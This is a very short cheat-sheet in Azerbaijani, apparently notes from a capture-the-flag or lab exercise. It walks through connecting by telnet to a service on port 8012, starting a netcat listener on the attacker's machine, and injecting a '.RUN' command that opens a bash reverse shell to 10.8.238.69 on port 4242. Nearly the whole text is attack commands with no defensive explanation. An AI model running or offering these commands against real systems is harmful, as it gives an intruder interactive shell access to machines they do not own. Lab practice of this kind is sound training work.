## telnet ile qosulduqdan sonra (default 8012 port) 
    telnet ip adress {port}
## netcat ile 
## oz atack masinimizda
    nc -nvlp 4242 
## telnet ile qosulduqumuz 
    .RUN /bin/bash -c  'bash -i >& /dev/tcp/10.8.238.69/4242 0>&1'
